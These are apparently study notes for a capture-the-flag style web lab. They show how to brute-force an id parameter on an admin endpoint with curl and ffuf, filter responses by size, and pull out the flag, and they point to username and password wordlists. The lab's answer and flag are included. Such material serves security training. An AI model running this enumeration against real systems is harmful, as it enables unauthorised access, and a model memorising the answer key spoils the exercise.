# Section 12 — Value Fuzzing

> Fuzz the value of a known parameter to find the valid input that unlocks content.

---

## Lab Answer

| Question | Answer |
|----------|--------|
| Valid id value | `73` |
| Flag | `HTB{p4r4m373r_fuzz1n6_15_k3y!}` |

---

## The Workflow

**Step 1 — Build a numeric wordlist:**
```bash
seq 1 1000 > ids.txt
# or the for loop equivalent:
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```
> Generates numbers 1 through 1000 and writes them to a file, one per line. Use this as the wordlist for numeric ID fuzzing. Expand to `seq 1 10000` if the first run finds nothing.

**Step 2 — Fuzz the value position:**
```bash
# Get the "Invalid id!" response size first
curl -s -o /dev/null -w "%{size_download}" \
  -H 'Host: admin.academy.htb' \
  -X POST -d 'id=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  "http://TARGET_IP:PORT/admin/admin.php"
# Returns: 768

ffuf -w ids.txt:FUZZ \
  -u "http://TARGET_IP:PORT/admin/admin.php" \
  -H 'Host: admin.academy.htb' \
  -X POST -d 'id=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fs 768 \
  -t 100
# Returns: 73
```
> First curl measures the size of the "wrong value" response. Then ffuf fuzzes the value position and filters out that size. The one response with a different size is the valid ID.

**Step 3 — Retrieve the flag with curl:**
```bash
curl -s \
  -H 'Host: admin.academy.htb' \
  -X POST -d 'id=73' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  "http://TARGET_IP:PORT/admin/admin.php"
# Returns: HTB{p4r4m373r_fuzz1n6_15_k3y!}
```
> ffuf only tells you a different response occurred — it doesn't show you the content. Always follow up with curl using the found value to retrieve the actual flag or data.

---

## Choosing the Right Wordlist for Values

| Parameter type | Wordlist approach |
|----------------|-------------------|
| Numeric ID | `seq 1 1000 > ids.txt` |
| Username | `~/SecLists/Usernames/top-usernames-shortlist.txt` |
| Password | `~/SecLists/Passwords/Common-Credentials/10k-most-common.txt` |
| Custom format | Build your own with `seq`, `crunch`, or Python |

---

## Exam Notes

- Value fuzzing = same mechanics as param fuzzing, just FUZZ moves to the value position: `id=FUZZ`
- Always filter by the "wrong value" response size, not the "missing param" size — they may differ
- Start with `seq 1 1000` for numeric IDs; expand to 10000 if no hit
- After finding the right value with ffuf, always follow up with curl to get the actual content (ffuf just tells you a different response occurred)
- The flag/sensitive content is in the response body — pipe curl through `grep -o '<p>.*</p>'` to extract it cleanly
